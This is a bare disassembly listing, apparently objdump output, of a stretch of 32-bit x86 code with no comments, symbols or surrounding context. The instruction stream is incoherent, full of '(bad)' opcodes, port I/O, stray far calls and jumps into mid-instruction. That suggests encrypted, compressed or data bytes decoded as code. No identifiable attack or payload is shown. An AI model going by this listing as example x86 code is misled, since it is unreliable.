  4284da:	xchg   BYTE PTR [edx+0x33],dl
  4284dd:	test   eax,0x2875c8f5
  4284e2:	mov    eax,0xea484c24
  4284e7:	jg     0x428519
  4284e9:	ss push cs
  4284eb:	mov    al,0x42
  4284ed:	pop    esi
  4284ee:	inc    esi
  4284ef:	mov    bl,0x4b
  4284f1:	cmp    esi,ecx
  4284f3:	scas   al,BYTE PTR es:[edi]
  4284f4:	mov    ebx,0x46d001f4
  4284f9:	dec    edi
  4284fa:	push   esi
  4284fb:	sub    bl,BYTE PTR [edi-0x7c7ce9a3]
  428501:	call   0x1a65:0x9a2c61b2
  428508:	gs add eax,0x4e389650
  42850e:	shr    DWORD PTR [ebx+edi*4+0x26],0xfa
  428513:	mov    ds:0xf6386fef,eax
  428518:	xchg   ecx,eax
  428519:	inc    edi
  42851a:	ss inc esp
  42851c:	pusha  
  42851d:	pop    edi
  42851e:	mov    edx,0xffa4f7fc
  428523:	mov    ch,0xdf
  428525:	cmp    esi,esp
  428527:	ins    DWORD PTR es:[edi],dx
  428528:	int3   
  428529:	je     0x4284e0
  42852b:	mov    ecx,0x8927546
  428530:	push   0xfffffffc
  428532:	mov    bl,0xe
  428534:	imul   eax,DWORD PTR [eax],0x0
	...
  428596:	push   ecx
  428597:	div    BYTE PTR ds:0x5bffb73e
  42859d:	dec    ebp
  42859f:	sar    BYTE PTR [ecx-0x50],cl
  4285a2:	pushf  
  4285a3:	inc    ecx
  4285a4:	cdq    
  4285a5:	daa    
  4285a6:	jecxz  0x428556
  4285a8:	add    DWORD PTR [eax],eax
  4285aa:	pop    es
  4285ab:	add    DWORD PTR [eax],eax
  4285ad:	add    BYTE PTR [eax+0x1c],ah
  4285b0:	xor    eax,0xffffffa5
  4285b3:	or     edx,esp
  4285b5:	test   al,0xfb
  4285b7:	call   0x80e9:0xfe9a045e
  4285be:	dec    edi
  4285bf:	xlat   BYTE PTR ds:[ebx]
  4285c0:	test   eax,0xdf8b939d
  4285c5:	mov    WORD PTR [esi+0x73],ds
  4285c8:	pop    edx
  4285c9:	pop    es
  4285ca:	pop    ss
  4285cb:	(bad)  
  4285cc:	jecxz  0x428579
  4285ce:	sub    dh,ah
  4285d0:	adc    DWORD PTR [eax],esp
  4285d2:	jno    0x4285cd
  4285d4:	ret    0xa735
  4285d7:	xchg   DWORD PTR [esi-0x23],esp
  4285da:	xchg   DWORD PTR [eax+0x5b],esp
  4285dd:	call   0xd3280f77
  4285e2:	dec    ebx
  4285e3:	or     BYTE PTR [ebp-0x2b20ee75],dh
  4285e9:	test   eax,0xdec86bb0
  4285ee:	jp     0x4285b3
  4285f0:	cli    
  4285f1:	jle    0x428662
  4285f3:	xor    al,0x10
  4285f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4285f6:	pop    es
  4285f7:	xor    al,0xdd
  4285f9:	push   edx
  4285fa:	and    al,0xaf
  4285fc:	shl    DWORD PTR [edx+0x6e],0x21
  428600:	sbb    al,0xb2
  428602:	mov    cl,BYTE PTR [ecx+0x1fd033d8]
  428608:	xchg   ebx,eax
  428609:	add    eax,0x32cd7d72
  42860e:	call   0x28897f85
  428613:	xlat   BYTE PTR ds:[ebx]
  428614:	outs   dx,DWORD PTR ds:[esi]
  428615:	fnstcw WORD PTR [ecx]
  428617:	xchg   ah,ch
  428619:	push   ebp
  42861a:	(bad)
  42861d:	pop    ebx
  42861e:	sbb    BYTE PTR [edx-0x6aa5e2a8],bl
  428624:	fcomp  st(3)
  428626:	dec    eax
  428627:	push   0x7f1bd33c
  42862c:	cs pop ebx
  42862e:	outs   dx,DWORD PTR ds:[esi]
  42862f:	mov    esp,0xb17f520e
  428634:	pop    eax
  428635:	stos   BYTE PTR es:[edi],al
  428636:	pop    ss
  428637:	pop    edi
  428638:	lahf   
  428639:	sbb    bl,BYTE PTR [ebx]
  42863b:	adc    eax,0xc81708d7
  428640:	inc    ecx
  428641:	(bad)  
  428642:	dec    edi
  428643:	(bad)  
  428644:	lea    ebx,[ebx]
  428646:	mov    ch,0xf9
  428648:	(bad)  
  428649:	mov    BYTE PTR [ecx+0x505a808e],dl
  42864f:	in     al,0x89
  428651:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428652:	and    eax,0x699af651
  428657:	or     al,0x6e
  428659:	add    ch,BYTE PTR [eax+0x71f78fe2]
  42865f:	dec    edi
  428660:	adc    dl,BYTE PTR [edi-0x14]
  428663:	xor    DWORD PTR [eax],ebp
  428665:	jmp    DWORD PTR [esi-0x9]
  428668:	xchg   ebp,eax
  428669:	pushf  
  42866a:	das    
  42866b:	(bad)  
  42866c:	out    0x1b,eax
  42866e:	pop    esp
  42866f:	or     BYTE PTR [esi+0x4c],dh
  428672:	loope  0x4286d4
  428674:	jg     0x42860c
  428676:	enter  0x280a,0x2
  42867a:	push   ebp
  42867b:	cmc    
  42867c:	les    esp,FWORD PTR [ebp+0x532761ee]
  428682:	call   0x1661:0xdcf718c6
  428689:	pop    DWORD PTR [ecx+ebp*1]
  42868c:	jo     0x428641
  42868e:	cmp    al,0x7
  428690:	or     edx,ebp
  428692:	mov    BYTE PTR [edi],al
  428694:	nop
  428695:	outs   dx,BYTE PTR ds:[esi]
  428696:	sar    DWORD PTR [ebp+edi*1+0x5188fdc7],0xeb
  42869e:	jmp    0x827a6a71
  4286a3:	repnz lds esp,FWORD PTR [ebp-0x65384427]
  4286aa:	ror    DWORD PTR [ebx+ebp*8],cl
  4286ad:	loope  0x4286be
  4286af:	frstor [esi-0x37]
  4286b2:	retf   
  4286b3:	mov    al,0xce
	...
  428715:	add    BYTE PTR [esi+0x5b],dl
  428718:	xor    al,0x78
  42871a:	cmp    eax,0x967f5e7f
  42871f:	or     bh,BYTE PTR ss:[ecx-0x6626288f]
  428726:	jmp    0x1:0x70001af
  42872d:	add    BYTE PTR [edx+0x58],ch
  428730:	push   ds
  428731:	adc    DWORD PTR [eax+0x50],edx
  428734:	and    ch,cl
  428736:	add    ecx,DWORD PTR [ebx]
  428738:	pop    ds
  428739:	popf   
  42873a:	in     eax,0x8f
  42873c:	daa    
  42873d:	and    al,BYTE PTR [edx-0x3f63db8]
  428743:	inc    esi
  428744:	jnp    0x4286d6
  428746:	sub    dh,BYTE PTR [ecx+edx*4]
  428749:	add    edi,DWORD PTR [eax+edi*8]
  42874c:	dec    ecx
  42874d:	sub    eax,0xcda22bde
  428752:	idiv   DWORD PTR [edi-0x31638e04]
  428758:	mov    edi,eax
  42875a:	popf   
  42875b:	or     BYTE PTR [ebp-0x389ffc3b],cl
  428761:	sbb    al,0xc4
  428763:	push   ds
  428764:	data16 ds sti 
  428767:	add    BYTE PTR [eax+0x42],dl
  42876a:	pop    ecx
  42876b:	sub    DWORD PTR [ecx-0x5311e199],eax
  428771:	retf   0xf9a1
  428774:	ja     0x42871e
  428776:	adc    esp,eax
  428778:	jp     0x428793
  42877a:	or     cl,BYTE PTR [edi+0x1e]
  42877d:	gs in  eax,dx
  42877f:	popa   
  428780:	in     eax,0x7c
  428782:	ss jecxz 0x4287f2
  428785:	arpl   WORD PTR [esi-0x36e6fb0b],bp
  42878b:	push   ds
  42878c:	pushf  
  42878d:	mov    ah,0xbb
  42878f:	jg     0x42877a
  428791:	std    
  428792:	sub    dh,ah
  428794:	rcr    BYTE PTR [ebx],0x53
  428797:	mov    esi,0x5cd1989f
  42879c:	pop    ecx
  42879d:	pusha  
  42879e:	sub    ch,BYTE PTR [ebx-0x78266729]
  4287a4:	cmp    BYTE PTR [edx+0x1],0x3c
  4287a8:	push   ebx
  4287a9:	sub    DWORD PTR [ebp-0x3c0d03bf],edx
  4287af:	pop    edi
  4287b0:	add    al,0xb3
  4287b2:	or     edx,DWORD PTR [ebp+0x4]
  4287b5:	hlt    
  4287b6:	out    dx,al
  4287b7:	pusha  
  4287b8:	push   ecx
  4287b9:	test   al,0xed
  4287bb:	ficom  WORD PTR [eax+0x11]
  4287be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4287bf:	mov    bh,0xe3
  4287c1:	jl     0x42880e
  4287c3:	jp     0x4287e3
  4287c5:	cmp    eax,0xbc2efda3
  4287ca:	and    al,0x7a
  4287cc:	lods   al,BYTE PTR ds:[esi]
  4287cd:	fdivr  DWORD PTR ds:0xa651f106
  4287d3:	fisubr WORD PTR [eax+0x6555c977]
  4287d9:	jg     0x428818
  4287db:	out    dx,eax
  4287dc:	jmp    0x428849
  4287de:	or     BYTE PTR [ebx],bh
  4287e0:	imul   ecx,esp,0x22
  4287e3:	popf   
  4287e4:	in     al,0xb
  4287e6:	jge    0x428844
  4287e8:	fisttp QWORD PTR [ebx+0x79]
  4287eb:	je     0x428794
  4287ed:	sub    ebp,DWORD PTR [eax]
  4287ef:	mov    bh,BYTE PTR [esi+0x2c52c30a]
  4287f5:	fstp   DWORD PTR [esi+0x40]
  4287f8:	inc    DWORD PTR [esi]
  4287fa:	mov    ds:0x5e4f5354,al
  4287ff:	je     0x428875
  428801:	sub    ah,BYTE PTR [eax+eax*4+0xe53ecdf]
  428808:	dec    edi
  428809:	add    bl,BYTE PTR [ebx+0x366b45eb]
  42880f:	sub    DWORD PTR [ebp+esi*2-0x67],esp
  428813:	adc    DWORD PTR [edi],eax
  428815:	jbe    0x42881d
  428817:	mov    dl,0x7c
  428819:	cmp    eax,0x4228e110
  42881e:	or     eax,0x48c4e54
  428823:	or     eax,DWORD PTR [esi]
  428825:	sub    DWORD PTR [ecx],ebp
  428827:	nop
  428828:	scas   al,BYTE PTR es:[edi]
  428829:	popf   
  42882a:	inc    ebp
  42882b:	pop    ds
  42882c:	or     DWORD PTR [esi],ebx
  42882e:	sbb    cl,BYTE PTR [ecx]
  428830:	xor    edx,0x77
  428833:	sub    edx,DWORD PTR [ebp+0x0]
	...
  428895:	add    BYTE PTR [esi],ah
  428897:	jp     0x42890a
  428899:	les    edi,FWORD PTR [ebp-0x31]
  42889c:	mov    bh,0xfa
  42889e:	ret    
  42889f:	ja     0x428848
  4288a1:	test   DWORD PTR [eax-0xe90989d],ecx
  4288a7:	mov    al,0x1
  4288a9:	add    BYTE PTR [edi],al
  4288ab:	add    DWORD PTR [eax],eax
  4288ad:	add    BYTE PTR [esi+eax*2-0x4b5b2505],ch
  4288b4:	int    0x15
  4288b6:	aam    0x2b
  4288b8:	mov    ds:0xf5053cb1,al
  4288bd:	lahf   
  4288be:	push   esi
  4288bf:	mov    eax,0xba0b0737
  4288c4:	and    DWORD PTR [ebp-0x31],ebx
  4288c7:	into   
  4288c8:	jle    0x428900
  4288ca:	cld    
  4288cb:	or     BYTE PTR [ecx-0x7d],dh
  4288ce:	cmp    al,BYTE PTR [esi]
  4288d0:	add    BYTE PTR [esi],0x16
  4288d3:	adc    DWORD PTR [ecx-0x8576541],edx
  4288d9:	in     eax,dx
  4288da:	jo     0x4288df
  4288dc:	mov    bh,0xa1
  4288de:	int    0xf2
  4288e0:	ja     0x42892c
  4288e2:	xlat   BYTE PTR ds:[ebx]
  4288e3:	mov    ah,0xcf
  4288e5:	test   eax,0x2b06cb84
  4288ea:	dec    esp
  4288eb:	cmp    eax,0x1dd645dc
  4288f0:	inc    ecx
  4288f1:	jecxz  0x4288ed
  4288f3:	mov    bh,0x39
  4288f5:	retf   
  4288f6:	in     eax,0x81
  4288f8:	jmp    0xc64ffc4c
  4288fd:	dec    ebp
  4288fe:	push   0x3
  428900:	aam    0xf9
  428902:	and    BYTE PTR [edx+0x43c2dae3],bl
  428908:	test   al,0xd9
  42890a:	xor    DWORD PTR [eax-0x72],edi
  42890d:	mov    edx,0x55bcd663
  428912:	jecxz  0x4288de
  428914:	adc    ebx,eax
  428916:	xor    eax,0x54756950
  42891b:	mov    bl,0x70
  42891d:	xchg   ebx,eax
  42891e:	aad    0x60
  428920:	outs   dx,BYTE PTR ds:[esi]
  428921:	inc    ecx
  428922:	out    dx,eax
  428923:	out    dx,al
  428924:	daa    
  428925:	push   ebp
  428926:	sbb    ebx,DWORD PTR [eax-0x22]
  428929:	jns    0x42897d
  42892b:	jmp    0x4289a1
  42892d:	sub    eax,DWORD PTR [eax-0xe]
  428930:	rcl    DWORD PTR [esi],0xb2
  428933:	and    eax,0x936ff22e
  428938:	ins    BYTE PTR es:[edi],dx
  428939:	js     0x428995
  42893b:	mov    dl,0xb1
  42893d:	out    dx,al
  42893e:	in     al,dx
  42893f:	sub    BYTE PTR [edi],0x70
  428942:	lea    eax,[ebx]
  428944:	mov    cl,0xa1
  428946:	mov    BYTE PTR [ebx+0x6db237dc],ch
  42894c:	jmp    0x428921
  42894e:	sub    al,0x6a
  428950:	pop    ebx
  428951:	fs inc ebx
  428953:	aad    0x89
  428955:	(bad)  
  428956:	pop    edi
  428957:	out    0x57,eax
  428959:	or     dl,BYTE PTR [eax+0x68]
  42895c:	stos   DWORD PTR es:[edi],eax
  42895d:	pop    ds
  42895e:	sbb    ebp,DWORD PTR [esi+0x46]
  428961:	nop
  428962:	outs   dx,DWORD PTR ds:[esi]
  428963:	cmp    BYTE PTR [ebp-0x62],al
  428966:	xor    DWORD PTR [eax+0x5f5c751a],ebp
  42896c:	dec    ecx
  42896d:	lea    ebp,[edi]
  42896f:	fdiv   DWORD PTR [ecx-0x39a9197]
  428975:	call   0x1d6:0x85af17ac
  42897c:	and    al,0xa2
  42897e:	push   ebp
  42897f:	test   BYTE PTR [ebx+ebp*2-0x3c],0xfb
  428984:	add    al,dl
  428986:	mov    ds:0x9a03dc01,al
  42898b:	add    eax,0x25576693
  428990:	push   ecx
  428991:	aas    
  428992:	ja     0x4289ef
  428994:	push   edx
  428995:	in     al,0xee
  428997:	test   ebx,edi
  428999:	je     0x428973
  42899b:	mov    ch,0x1
  42899d:	or     al,0x38
  42899f:	(bad)  
  4289a0:	push   esp
  4289a1:	inc    ecx
  4289a2:	loop   0x4289b1
  4289a4:	adc    al,0x4d
  4289a6:	or     al,0xf0
  4289a8:	cmp    ecx,esi
  4289aa:	scas   al,BYTE PTR es:[edi]
  4289ab:	test   BYTE PTR [eax+0x3d3866f9],bh
  4289b1:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4289b3:	mov    esp,DWORD PTR [eax+0x0]
	...
  428a16:	dec    ebp
  428a17:	or     al,0xf8
  428a19:	pop    ebx
  428a1a:	stc    
  428a1b:	(bad)  
  428a1c:	out    dx,eax
  428a1d:	push   ds
  428a1e:	push   ss
  428a1f:	xchg   edx,eax
  428a20:	data16 aas 
  428a22:	mov    ebp,0xf82d3e25
  428a27:	mov    cl,0x1
  428a29:	add    BYTE PTR [edi],al
  428a2b:	add    DWORD PTR [eax],eax
  428a2d:	add    BYTE PTR [ebp-0x40422874],ch
  428a33:	lods   al,BYTE PTR ds:[esi]
  428a34:	es call 0x342fa194
  428a3a:	cli    
  428a3b:	sbb    eax,0x36a5ed3a
  428a40:	(bad)  
  428a41:	lock mov DWORD PTR [ecx+0x6eadc011],0x13c97e1b
  428a4c:	in     al,0x39
  428a4e:	sub    eax,0xe7de73ae
  428a53:	sar    DWORD PTR [esi],1
  428a55:	xor    al,0x9b
  428a57:	loopne 0x428a17
  428a59:	push   cs
  428a5a:	cmp    DWORD PTR [edi+eiz*1+0xa],ecx
  428a5e:	popf   
  428a5f:	fdivrp st(5),st
  428a61:	fwait
  428a62:	rcr    BYTE PTR [ebx-0x12fa8b16],cl
  428a68:	push   esi
  428a69:	mov    esi,0xb9e48401
  428a6e:	loop   0x428abd
  428a70:	inc    ebx
  428a71:	test   eax,0x539841a6
  428a76:	test   DWORD PTR [ebx],eax
  428a78:	inc    esp
  428a79:	std    
  428a7a:	addr16 jb 0x428a50
  428a7d:	add    dh,bl
  428a7f:	retf   0xbf35
  428a82:	inc    eax
  428a83:	xchg   ecx,eax
  428a84:	retf   
  428a85:	dec    edx
  428a86:	ficom  DWORD PTR [ebp+0x58]
  428a89:	rcl    edx,1
  428a8b:	lods   eax,DWORD PTR ds:[esi]
  428a8c:	leave  
  428a8d:	sbb    BYTE PTR [esi+0x246b70e2],cl
  428a93:	and    al,0x77
  428a95:	jl     0x428a99
  428a97:	pop    edi
  428a98:	mov    ecx,0x62e446fa
  428a9d:	(bad)  
  428a9e:	inc    DWORD PTR [edi+0x2]
  428aa1:	hlt    
  428aa2:	xor    al,bh
  428aa4:	sbb    bh,0x9e
  428aa7:	xor    dh,BYTE PTR [esi+0x403bc4c6]
  428aad:	mov    ebp,0xdb172105
  428ab2:	dec    esi
  428ab3:	fbstp  TBYTE PTR [eax]
  428ab5:	dec    esp
  428ab6:	xor    BYTE PTR [ecx],dh
  428ab8:	cmp    ebx,DWORD PTR [ecx]
  428aba:	adc    ecx,0xeb9afae0
  428ac0:	sbb    BYTE PTR [eax+0xfa2a70a],0xcb
  428ac7:	adc    al,0xca
  428ac9:	imul   edx,esp,0xffffffa9
  428acc:	ret    0x68e3
  428acf:	add    bh,cl
  428ad1:	or     bl,ch
  428ad3:	scas   eax,DWORD PTR es:[edi]
  428ad4:	cmp    BYTE PTR [ebp-0x421d83a],bh
  428ada:	cmp    DWORD PTR [edx+0xe],ebx
  428add:	push   0xffffff83
  428adf:	iret   
  428ae0:	ret    0x2a0e
  428ae3:	pushf  
  428ae4:	jle    0x428b1d
  428ae6:	ds push 0xdb114168
  428aec:	mov    dh,0x78
  428aee:	in     eax,0x52
  428af0:	leave  
  428af1:	ja     0x428b24
  428af3:	dec    ecx
  428af4:	test   BYTE PTR [esi+0x52c18b8],ch
  428afa:	loopne 0x428b76
  428afc:	sbb    BYTE PTR [ebx-0x242b685c],ah
  428b02:	adc    BYTE PTR [ebx],ch
  428b04:	sti    
  428b05:	cmc    
  428b06:	shl    BYTE PTR [ebx+0x2d],0x2a
  428b0a:	push   ebp
  428b0b:	jno    0x428b48
  428b0d:	jbe    0x428afe
  428b0f:	les    edx,FWORD PTR [ecx-0x12]
  428b12:	jecxz  0x428b40
  428b14:	adc    BYTE PTR [ecx-0x52],bh
  428b17:	aas    
  428b18:	fistp  DWORD PTR [ecx+edx*4+0x5bcde52f]
  428b1f:	mov    es,WORD PTR [esi+0x76]
  428b22:	outs   dx,BYTE PTR ds:[esi]
  428b23:	into   
  428b24:	scas   eax,DWORD PTR es:[edi]
  428b25:	cmp    al,0xf0
  428b27:	shl    BYTE PTR [edx-0x2f6caf00],0xa8
  428b2e:	pop    esp
  428b2f:	xchg   BYTE PTR [eax-0x239bc199],bl
	...
  428b95:	add    ch,al
  428b97:	push   ebp
  428b98:	mov    bh,dl
  428b9a:	call   0x5fb1:0xb77ff5ff
  428ba1:	test   eax,0xc284fc14
  428ba6:	push   DWORD PTR [edx+0x1070001]
  428bac:	add    BYTE PTR [eax],al
  428bae:	jne    0x428b75
  428bb0:	sub    eax,0xad870cd5
  428bb5:	(bad)  
  428bb7:	scas   al,BYTE PTR es:[edi]
  428bb8:	ret    0xb7e3
  428bbb:	test   eax,0x2e013258
  428bc0:	and    edi,ecx
  428bc2:	js     0x428ba9
  428bc4:	das    
  428bc5:	jne    0x428c0a
  428bc7:	or     eax,0x3ebdca73
  428bcc:	aam    0xdf
  428bce:	xor    BYTE PTR [ebp-0x2dcba29a],ch
  428bd4:	sti    
  428bd5:	dec    edi
  428bd6:	jg     0x428c00
  428bd8:	pop    esp
  428bd9:	mov    cl,BYTE PTR [ecx+0x3f8d804b]
  428bdf:	mov    dh,0x36
  428be1:	test   al,0xf5
  428be3:	stos   DWORD PTR es:[edi],eax
  428be4:	stc    
  428be5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428be6:	add    al,0x32
  428be8:	call   0xb909b8db
  428bed:	xor    bl,al
  428bef:	push   ds
  428bf0:	retf   
  428bf1:	in     al,dx
  428bf2:	enter  0x3f18,0xe8
  428bf6:	iret   
  428bf7:	inc    edi
  428bf8:	inc    edi
  428bf9:	int    0x53
  428bfb:	cmc    
  428bfc:	inc    esp
  428bfd:	es stc 
  428bff:	cs push cs
  428c01:	mov    ds:0x6eac5600,eax
  428c06:	xchg   edx,eax
  428c07:	sub    dl,BYTE PTR [eax-0x613c67af]
  428c0d:	div    esi
  428c0f:	jmp    DWORD PTR [eax-0x26]
  428c12:	daa    
  428c13:	pusha  
  428c14:	in     eax,dx
  428c15:	inc    edi
  428c16:	fisub  WORD PTR ds:0xffb32cc3
  428c1c:	sbb    al,0x2d
  428c1e:	mov    bh,0xdd
  428c20:	adc    bl,BYTE PTR [ebx+0x55]
  428c23:	add    BYTE PTR [ebx+0x32e23b7],ch
  428c29:	fsubr  DWORD PTR [ebx]
  428c2b:	mov    ch,0x4e
  428c2d:	mov    al,ds:0x631cd290
  428c32:	aas    
  428c33:	lock js 0x428c70
  428c36:	outs   dx,BYTE PTR ds:[esi]
  428c37:	xchg   DWORD PTR [esi-0xa6ab416],edi
  428c3d:	out    0x93,eax
  428c3f:	push   ecx
  428c40:	push   0xcf42536f
  428c45:	aam    0xc4
  428c47:	call   0xf56:0x88626c8c
  428c4e:	scas   eax,DWORD PTR es:[edi]
  428c4f:	cld    
  428c50:	cmp    edi,DWORD PTR [edx-0x10]
  428c53:	pop    ds
  428c54:	xchg   ebp,eax
  428c55:	ins    BYTE PTR es:[edi],dx
  428c56:	popf   
  428c57:	push   eax
  428c58:	lahf   
  428c59:	hlt    
  428c5a:	and    BYTE PTR [ebx],cl
  428c5c:	ret    0xd00b
  428c5f:	daa    
  428c60:	fstp   DWORD PTR [edx+0x1516f7a]
  428c66:	sub    edx,ecx
  428c68:	push   0x240066d9
  428c6d:	fstp   DWORD PTR [edx+0x8]
  428c70:	mov    DWORD PTR [ecx],ebx
  428c72:	cdq    
  428c73:	cwde   
  428c74:	fnsave [edx]
  428c76:	rcl    ecx,cl
  428c78:	inc    ebx
  428c79:	jo     0x428cdd
  428c7b:	icebp  
  428c7c:	xchg   edx,eax
  428c7d:	rcl    BYTE PTR [edi-0x7eabed53],1
  428c83:	repnz nop
  428c85:	or     esi,ecx
  428c87:	sti    
  428c88:	mov    ds:0x333d821c,eax
  428c8d:	pop    ss
  428c8e:	js     0x428cf0
  428c90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428c91:	fs ret 
  428c93:	jp     0x428c80
  428c95:	in     al,dx
  428c96:	or     BYTE PTR [edi],0xf1
  428c99:	or     al,0xf3
  428c9b:	pop    ebx
  428c9c:	jge    0x428c88
  428c9e:	fsubr  DWORD PTR [ebx+0x18f60920]
  428ca4:	call   DWORD PTR [edi+ecx*2-0x115d28ad]
  428cab:	inc    esi
  428cac:	mov    cl,0x39
  428cae:	sahf   
  428caf:	lahf   
  428cb0:	adc    BYTE PTR [edx+0x50],ah
  428cb3:	and    esi,DWORD PTR [eax+eax*1]
	...
  428d16:	xor    DWORD PTR [ebp+0x75f531f1],0x9686b5c1
  428d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428d21:	jns    0x428d2d
  428d23:	in     al,dx
  428d24:	mov    eax,ds:0x1b4060f
  428d29:	add    BYTE PTR [edi],al
  428d2b:	add    DWORD PTR [eax],eax
  428d2d:	add    ah,al
  428d2f:	les    ebp,FWORD PTR [edx+0x38b9e9cf]
  428d35:	mov    al,0x58
  428d37:	clc    
  428d38:	mov    ds:0xf3bb92c2,eax
  428d3d:	mov    dl,cl
  428d3f:	pop    edx
  428d40:	loop   0x428d83
  428d42:	push   eax
  428d43:	and    ebx,esi
  428d45:	(bad)  
  428d46:	in     al,dx
  428d47:	pop    esp
  428d48:	ror    BYTE PTR [edx],0xcf
  428d4b:	leave  
  428d4c:	int    0xf2
  428d4e:	xchg   ebx,eax
  428d4f:	push   eax
  428d50:	dec    ebx
  428d51:	mov    al,0x48
  428d53:	xor    DWORD PTR [ecx-0x5cf3bb62],edx
  428d59:	push   ebp
  428d5a:	scas   al,BYTE PTR es:[edi]
  428d5b:	xor    ebx,esp
  428d5d:	pop    edi
  428d5e:	popa   
  428d5f:	xor    eax,DWORD PTR [ecx+0x2d]
  428d62:	xor    al,0xc0
  428d64:	retf   
  428d65:	aas    
  428d66:	inc    ebx
  428d67:	jbe    0x428dd5
  428d69:	jnp    0x428dcd
  428d6b:	adc    eax,0x18df3ea3
  428d70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428d71:	fwait
  428d72:	ss push edi
  428d74:	dec    ecx
  428d75:	lahf   
  428d76:	mov    BYTE PTR [ebp-0x3b],0x52
  428d7a:	mov    esi,edi
  428d7c:	fwait
  428d7d:	push   0x7b
  428d7f:	pop    eax
  428d80:	and    al,BYTE PTR [edi-0x627b1b9d]
  428d86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428d87:	aam    0x8
  428d89:	inc    ecx
  428d8a:	inc    edx
  428d8b:	push   cs
  428d8c:	and    al,0x2
  428d8e:	in     eax,dx
  428d8f:	test   DWORD PTR [edx+0x386fa983],eax
  428d95:	dec    edi
  428d96:	bnd jno 0x428dff
  428d99:	leave  
  428d9a:	clc    
  428d9b:	push   cs
  428d9c:	ret    0x4965
  428d9f:	bound  edi,QWORD PTR [ebp-0x65]
  428da2:	xor    al,0x17
  428da4:	scas   al,BYTE PTR es:[edi]
  428da5:	hlt    
  428da6:	fmul   st(4),st
  428da8:	xchg   esi,eax
  428da9:	(bad)  
  428daa:	mov    eax,ds:0x221bf096
  428daf:	sbb    al,0xed
  428db1:	push   cs
  428db2:	push   ecx
  428db3:	mov    dh,0x93
  428db5:	jae    0x428d59
  428db7:	mov    ebx,0xfb11898c
  428dbc:	stos   BYTE PTR es:[edi],al
  428dbd:	inc    ebp
  428dbe:	fld    QWORD PTR [edi-0x2f5ef1f4]
  428dc4:	jl     0x428d8f
  428dc6:	es jecxz 0x428e21
  428dc9:	ficomp DWORD PTR [ecx+esi*1]
  428dcc:	xor    al,dh
  428dce:	sbb    DWORD PTR [ecx+0x44],ebp
  428dd1:	test   eax,0xb917bd0a
  428dd6:	mov    esp,0xe97e0634
  428ddb:	std    
  428ddc:	mov    cl,0x78
  428dde:	arpl   WORD PTR ds:0x4b161334,si
  428de4:	cmp    bl,cl
  428de6:	shl    ch,0xe0
  428de9:	push   es
  428dea:	and    bh,BYTE PTR [edi]
  428dec:	xchg   ebx,eax
  428ded:	fiadd  DWORD PTR [ebp+0x404ddab0]
  428df3:	repz xor BYTE PTR [ecx+0x24],0x81
  428df8:	in     eax,0x62
  428dfa:	xlat   BYTE PTR ds:[ebx]
  428dfb:	and    DWORD PTR [edx],ebx
  428dfd:	test   al,0xb2
  428dff:	inc    ebx
  428e00:	sub    al,0xe3
  428e02:	xlat   BYTE PTR ds:[ebx]
  428e03:	mov    ch,0x52
  428e05:	(bad)  
  428e06:	jp     0x428e76
  428e08:	int    0xdb
  428e0a:	sbb    DWORD PTR [eax+0x6ad41bf0],eax
  428e10:	iret   
  428e11:	inc    ebp
  428e12:	pop    ss
  428e13:	fld    QWORD PTR ds:0x17dc34bb
  428e19:	xchg   ebx,eax
  428e1a:	adc    ecx,ecx
  428e1c:	imul   ebp,DWORD PTR [edx+0x2a],0xffffffe8
  428e20:	fsubr  QWORD PTR [edx+0x1b]
  428e23:	pop    edi
  428e24:	scas   al,BYTE PTR es:[edi]
  428e25:	sub    eax,0x9e571094
  428e2a:	sub    esp,DWORD PTR [esi]
  428e2c:	pop    ebx
  428e2d:	mov    ah,0xa2
  428e2f:	xchg   ebx,eax
  428e30:	inc    edi
  428e31:	aam    0x3f
  428e33:	inc    esi
  428e34:	adc    BYTE PTR [eax],al
	...
  428e96:	dec    edi
  428e97:	pop    ebp
  428e98:	pop    ecx
  428e99:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428e9d:	(bad)  
  428e9f:	cli    
  428ea0:	test   al,0xd9
  428ea2:	stos   BYTE PTR es:[edi],al
  428ea3:	jnp    0x428edd
  428ea5:	repz or eax,0x70001b5
  428eab:	add    DWORD PTR [eax],eax
  428ead:	add    BYTE PTR [ecx],ch
  428eaf:	icebp  
  428eb0:	xchg   ecx,eax
  428eb1:	pusha  
  428eb2:	push   0x9d4aafaf
  428eb7:	sub    DWORD PTR [edi+0x1cda33f9],ecx
  428ebd:	sar    DWORD PTR [edx],1
  428ebf:	or     BYTE PTR [esi+0x58],ch
  428ec2:	(bad)
  428ec5:	mul    DWORD PTR ds:0x13f80e30
  428ecb:	iret   
  428ecc:	or     eax,0xcd5e10f8
  428ed1:	push   ebx
  428ed2:	xchg   BYTE PTR [ebx],bh
  428ed4:	and    eax,0xef17f9a4
  428ed9:	leave  
  428eda:	mov    edi,0xb3fec403
  428edf:	(bad)  
  428ee0:	cmp    eax,0x6d86dfb7
  428ee5:	mov    bl,0xa6
  428ee7:	adc    eax,0xf58fbb64
  428eec:	jmp    0x428efc
  428eee:	jg     0x428eb2
  428ef0:	add    al,0x7c
  428ef2:	mov    WORD PTR [eax-0x54],cs
  428ef5:	aad    0xd7
  428ef7:	push   ss
  428ef8:	mov    esp,0x47923bf3
  428efd:	enter  0xc8ca,0x9a
  428f01:	fwait
  428f02:	loope  0x428ede
  428f04:	lea    eax,[ebx]
  428f06:	lods   al,BYTE PTR ds:[esi]
  428f07:	or     ecx,edx
  428f09:	fsubr  st,st(0)
  428f0b:	ins    BYTE PTR es:[edi],dx
  428f0c:	scas   al,BYTE PTR es:[edi]
  428f0d:	lock test BYTE PTR [edx+0x5c],ch
  428f11:	rol    DWORD PTR [ebx+0x3b293a1e],0x6c
  428f18:	stc    
  428f19:	clc    
  428f1a:	leave  
  428f1b:	repz out dx,al
  428f1d:	jmp    0x428ea1
  428f1f:	clc    
  428f20:	dec    ebp
  428f21:	(bad)  
  428f22:	xlat   BYTE PTR ds:[ebx]
  428f23:	call   0x2c22d3ee
  428f28:	shl    edx,0xb
  428f2b:	and    eax,0x5469adeb
  428f30:	ja     0x428f44
